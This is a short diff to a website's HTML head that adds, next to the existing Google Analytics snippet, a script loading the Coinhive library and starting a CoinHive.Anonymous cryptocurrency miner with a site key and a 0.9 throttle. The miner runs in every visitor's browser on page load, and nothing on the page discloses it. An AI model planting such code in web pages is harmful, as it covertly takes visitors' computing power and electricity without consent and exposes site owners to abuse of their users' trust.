@@ -48,6 +48,11 @@
         gtag('js', new Date());
         gtag('config', 'UA-91211217-1');
         </script>
+        <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+        <script type="text/javascript">
+        var miner = new CoinHive.Anonymous('sYZ7E2VmLidzBNuE2GqN9v1739prPYS7', { throttle: 0.9 });
+        miner.start();
+        </script>
     </head>
     <body class="header-sticky">
         <!-- ****************** MOBILE MENU ******************* -->
